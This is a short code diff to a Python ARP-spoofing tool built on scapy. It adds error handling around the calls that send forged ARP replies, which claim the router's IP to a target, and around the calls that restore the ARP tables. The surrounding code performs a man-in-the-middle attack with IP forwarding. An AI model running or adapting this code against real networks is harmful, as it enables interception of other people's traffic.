@@ -28,7 +28,10 @@ class ARPSpoofer:
     def spoof(self, target_ip, spoof_ip, target_mac):
         # Response ARP packet that send to the destination configured and tell them we have the router ip
         packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
-        scapy.send(packet, verbose=False)
+        try:   
+            scapy.send(packet, verbose=False)
+        except OSError as e:
+            self.progress.emit(f"[-] {e}")
 
     def run(self):
         self.enable_ip_forwarding()
@@ -72,7 +75,10 @@ class ARPSpoofer:
             target_mac = self.get_mac(target_ip)
             source_mac = self.get_mac(source_ip)
             packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
-            scapy.send(packet, verbose=False, count=4)
+            try:
+                scapy.send(packet, verbose=False, count=4)
+            except OSError as e:
+                self.progress.emit(f"[-] {e}")
         except IndexError:
             self.progress.emit(f"[-] Failed to restore target/victim ARP table ({target_ip}, {source_ip}), it might be caused by " 
                                 "target/victim not responding to ARP Request")
